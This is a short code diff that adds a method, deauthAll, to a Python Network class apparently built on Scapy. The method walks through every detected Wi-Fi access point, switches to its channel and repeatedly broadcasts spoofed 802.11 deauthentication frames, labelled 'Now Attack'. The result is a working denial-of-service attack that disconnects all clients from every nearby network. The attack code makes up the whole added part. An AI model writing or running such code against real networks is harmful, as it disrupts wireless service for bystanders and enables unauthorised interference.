@@ -119,6 +119,13 @@ class Network:
                     sendp(pkt, iface=self.interface, inter=0.1, loop=1, count=30)
                 except:
                     continue
+    def deauthAll(self):
+        aplist = self.getApList()
+        for ap in aplist:
+            print("Now Attack:", ap['ssid'], ap['bssid'])
+            self.setChannel(int(ap['channel']))
+            pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=ap['bssid'], addr3=ap['bssid']) / Dot11Deauth()
+            sendp(pkt, iface=self.interface, inter=0.1, loop=1, count=30)
 
 if __name__ == "__main__":
 
